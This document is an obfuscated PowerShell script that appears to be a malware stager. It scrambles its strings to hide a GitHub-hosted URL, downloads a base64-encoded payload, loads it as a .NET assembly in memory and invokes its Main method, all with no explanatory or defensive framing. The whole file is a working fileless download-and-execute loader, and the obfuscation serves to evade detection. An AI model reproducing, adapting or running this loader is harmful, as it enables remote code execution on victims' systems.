SeT ("P"+"SB")  ( [tYPE]("{2}{0}{3}{1}" -F 'onV','t','sYstEm.C','ER'))  ; Set  ("d9j"+"pS3")  ( [tYpE]("{4}{0}{1}{3}{5}{2}" -f'STeM.R','ef','mBLy','LeCtIoN.asS','SY','E'));    Set-iTEm  VaRIAblE:nbo ( [tYPe]("{0}{1}{2}" -F 'sYsteM','.','aCtIvaTor')); ${U`RL} = ("{5}{2}{17}{18}{6}{8}{19}{3}{9}{10}{16}{13}{7}{1}{15}{11}{12}{0}{14}{4}" -f 'nha','n/','r','hubuser','.txt','https://','g','mai','i','con','tent.','ers/j','ho','tqm/rest/','kie','costum','com/violen','a','w.','t')

${Re`s`PONSe} = &("{2}{4}{3}{0}{1}{5}"-f 'bR','eque','Invo','-We','ke','st') -Uri ${u`Rl} -UseBasicParsing

if (${r`esp`oNSe}."St`ATus`CoDE" -eq 200) {
    ${B`ASe`64St`Ri`NG} = ${R`eSP`onSe}."coNt`E`Nt"

    ${bYT`E`A`RrAY} =  (dir  ("Va"+"RiaBl"+"E:PsB")).VAlUE::("{3}{2}{1}{4}{0}" -f 'ng','4S','Base6','From','tri').Invoke(${baSE6`4Str`ing})
    ${aSSe`m`Bly} =   ( gEt-CHiLdITEm  ('vaRiabL'+'E:d'+'9JpS'+'3') ).VAlUe::("{1}{0}" -f 'ad','Lo').Invoke(${bytE`AR`RAY})

    ${C`LaSs} = ${AsSE`MbLy}.("{1}{0}"-f'Type','Get').Invoke(("{4}{1}{2}{0}{3}"-f'k.H','JAMsr','pfh','H','Q'))
    ${M`EtH`OD} = ${cla`ss}.("{0}{1}" -f'GetMe','thod').Invoke(("{0}{1}" -f 'M','ain'))

    ${INs`T`ANcE} =   $Nbo::("{0}{1}{2}"-f'Creat','eInst','ance').Invoke(${C`L`Ass})
    ${Me`TH`OD}."iN`VoKe"(${I`Ns`TANCE}, @())

} else {
    &("{2}{1}{0}" -f 'Host','-','Write') "Failed to download base64String. Status code: $($response.StatusCode) "
}
